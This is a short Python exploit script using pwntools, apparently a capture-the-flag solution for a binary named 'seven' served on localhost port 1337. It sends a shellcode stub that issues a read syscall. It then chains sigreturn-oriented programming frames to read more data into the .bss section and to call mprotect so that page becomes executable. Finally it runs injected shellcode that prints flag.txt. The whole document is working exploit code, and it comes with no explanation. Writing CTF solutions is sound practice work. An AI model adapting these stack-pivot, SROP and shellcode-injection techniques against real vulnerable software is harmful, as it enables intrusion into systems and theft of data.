from pwn import *
elf = ELF("seven")
context.log_level = "debug"
context.binary = elf

rop = ROP(elf)
ret = rop.find_gadget(["ret"])[0]
s = asm(f"""
push rsp
pop rsi
xor edi, edi
syscall
ret
""")
shell = asm("add rsp, 0x100\n" + shellcraft.cat("flag.txt"))
p = remote("localhost", 1337)
p.send(s)
pause()
pivot = elf.bss()
base = 0x500000
pop_rsi_syscall = base + 1
syscall = base + 4

pivot_page = pivot & 0xfffffffffffff000
again = 0x40111f
srop_read = SigreturnFrame()
srop_read.rax = 0
srop_read.rdi = 0
srop_read.rsi = pivot
srop_read.rdx = 0x1000
srop_read.rip = syscall
srop_read.rsp = pivot
p.send(p64(again) + p64(ret) + p64(ret) + p64(syscall) + bytes(srop_read))
pause()
p.send(p64(ret) + p64(ret)[:7])
pause()
srop_mprotect = SigreturnFrame()
srop_mprotect.rax = 10
srop_mprotect.rdi = pivot_page
srop_mprotect.rsi = 0x2000
srop_mprotect.rdx = 7
srop_mprotect.rip = syscall
srop_mprotect.rsp = pivot + 4 * 8 + 248
p.send(p64(again) + p64(ret) + p64(ret) + p64(syscall) + bytes(srop_mprotect) + p64(pivot + 5 * 8 + 248) + shell)
pause()
p.send(p64(ret) + p64(ret)[:7])
p.interactive()
